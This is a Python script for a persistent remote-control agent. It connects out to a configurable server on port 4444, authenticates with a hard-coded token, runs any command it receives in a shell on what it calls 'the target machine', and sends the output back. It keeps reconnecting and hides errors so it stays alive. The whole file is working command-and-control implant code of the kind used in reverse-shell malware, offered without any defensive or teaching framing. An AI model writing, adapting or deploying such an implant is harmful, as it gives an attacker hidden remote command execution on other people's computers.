import socket
import json
import subprocess
import time

# --- Configuration ---
# Change these to match your server's host, port, and the token you generated
HOST = "127.0.0.1" 
PORT = 4444
TOKEN = b"DB4cACHcVu0"

def start_agent():
    while True:
        try:
            # 1. Connect to the server
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((HOST, PORT))
            
            # 2. Send the Authentication Token immediately 
            # (Your server waits 5 seconds for this in handle_client)
            s.sendall(TOKEN)

            # 3. Enter the main listening loop
            while True:
                data = s.recv(4096)
                if not data:
                    break # Connection closed by server
                
                # Parse the incoming JSON instruction
                message = data.decode(errors="ignore").strip()
                
                try:
                    instruction = json.loads(message)
                    task_id = instruction.get("task_id")
                    command = instruction.get("command")
                    
                    if not task_id or not command:
                        continue # Ignore invalid payloads
                        
                    # 4. Execute the command on the target machine
                    try:
                        # run the command in a shell and capture output + errors
                        output = subprocess.check_output(
                            command, 
                            shell=True, 
                            stderr=subprocess.STDOUT,
                            stdin=subprocess.DEVNULL
                        )
                        result_text = output.decode(errors="ignore")
                        print(result_text)
                    except subprocess.CalledProcessError as e:
                        # Catches errors if the command fails (e.g., 'ls /root' without perms)
                        result_text = e.output.decode(errors="ignore")
                    except Exception as e:
                        # Catches edge-case system errors
                        result_text = f"[!] Execution Error: {str(e)}"
                        
                    # Handle commands that succeed but have no text output (like 'mkdir')
                    if not result_text.strip():
                        result_text = "[Command executed successfully, no output]"

                    # 5. Package the response with the SAME task_id and send it back
                    response_payload = json.dumps({
                        "task_id": task_id,
                        "output": result_text
                    }) + "\n" # The newline \n is critical so the server's reader.read() loop catches it cleanly
                    
                    s.sendall(response_payload.encode())

                except json.JSONDecodeError:
                    # If the server sends something that isn't JSON, just ignore it
                    pass
                    
        except ConnectionRefusedError:
            # Server is offline, wait 5 seconds and try connecting again
            time.sleep(5)
        except Exception as e:
            # General fallback to keep the agent alive
            time.sleep(5)
        finally:
            s.close()

if __name__ == "__main__":
    start_agent()
